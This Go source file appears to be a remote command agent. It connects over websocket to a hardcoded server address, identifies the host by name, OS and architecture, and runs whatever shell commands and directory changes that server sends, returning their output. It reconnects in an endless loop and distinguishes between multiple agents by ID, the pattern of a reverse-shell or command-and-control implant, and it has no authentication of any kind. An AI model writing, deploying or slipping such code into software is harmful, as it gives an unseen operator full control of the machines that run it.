package main

import (
	"encoding/json"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

/* =========================
   CONFIG
========================= */

var NODE_URLS = []string{
	"ws://192.168.2.1:3000",
}

const RETRY_DELAY = 2 * time.Second

/* =========================
   TYPES
========================= */

type WSMessage struct {
	Type    string          `json:"type"`
	AgentID string          `json:"agentId"`
	Content json.RawMessage `json:"content"`
}

/* =========================
   HELPERS
========================= */

func generateClientID() string {
	host, _ := os.Hostname()
	return host + " | " + runtime.GOOS + " | " + runtime.GOARCH
}

func sendJSON(conn *websocket.Conn, t string, c interface{}) error {
	content, _ := json.Marshal(c)
	msg := WSMessage{Type: t, Content: content}
	data, _ := json.Marshal(msg)
	return conn.WriteMessage(websocket.TextMessage, data)
}

/*
	=========================
	  MESSAGE HANDLERS

=========================
*/
func handleMessage(
	conn *websocket.Conn,
	msg WSMessage,
	currentDir *string,
) {
	switch msg.Type {

	case "id":
		sendJSON(conn, "id", generateClientID())

	case "ping":
		sendJSON(conn, "pong", "🏓 pong")

	case "cd":
		var path string
		json.Unmarshal(msg.Content, &path)
		handleCD(conn, path, currentDir)

	case "exec":
		var command string
		json.Unmarshal(msg.Content, &command)
		handleExec(conn, command, *currentDir)

	default:
		sendJSON(conn, "error", "❓ unknown message type: "+msg.Type)
	}
}

func handleCD(conn *websocket.Conn, target string, currentDir *string) {
	target = strings.TrimSpace(target)

	if target == "" {
		sendJSON(conn, "output", "⚠️ empty path")
		return
	}

	if !filepath.IsAbs(target) {
		target = filepath.Join(*currentDir, target)
	}
	target = filepath.Clean(target)

	if info, err := os.Stat(target); err == nil && info.IsDir() {
		*currentDir = target
		sendJSON(conn, "output", "📁 "+*currentDir)
		return
	}

	sendJSON(conn, "output", "❌ directory not found")
}

func handleExec(conn *websocket.Conn, command string, dir string) {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		sendJSON(conn, "output", "⚠️ empty command")
		return
	}

	cmd := exec.Command(parts[0], parts[1:]...)
	cmd.Dir = dir

	out, err := cmd.CombinedOutput()
	if err != nil {
		sendJSON(conn, "output", "❌ "+err.Error())
		return
	}

	if len(out) == 0 {
		sendJSON(conn, "output", "✅ done")
	} else {
		sendJSON(conn, "output", string(out))
	}
}

/* =========================
   MAIN LOOP
========================= */

func main() {
	for {
		var conn *websocket.Conn
		var err error
		var connectedURL string

		// 🔁 Try all Node URLs
		for _, url := range NODE_URLS {
			log.Println("🔄 trying", url)
			conn, _, err = websocket.DefaultDialer.Dial(url, nil)
			if err != nil {
				log.Println("❌ failed:", url)
				continue
			}

			connectedURL = url
			log.Println("✅ connected to", url)
			break
		}

		if conn == nil {
			log.Println("⏳ all nodes unreachable, retrying...")
			time.Sleep(RETRY_DELAY)
			continue
		}

		// 🆔 Identify immediately
		sendJSON(conn, "id", generateClientID())

		currentDir, _ := os.Getwd()

		// 🔌 Session loop
		for {
			_, raw, err := conn.ReadMessage()
			if err != nil {
				log.Println("⚠️ disconnected from", connectedURL)
				conn.Close()
				break
			}

			var msg WSMessage
			if err := json.Unmarshal(raw, &msg); err != nil {
				sendJSON(conn, "error", "❌ invalid JSON")
				continue
			}

			// 🚫 Ignore messages for other agents
			if msg.AgentID != "" && msg.AgentID != generateClientID() {
				log.Println("🚫 command for another agent:", msg.AgentID)
				continue
			}

			handleMessage(conn, msg, &currentDir)

		}

		time.Sleep(RETRY_DELAY)
	}
}
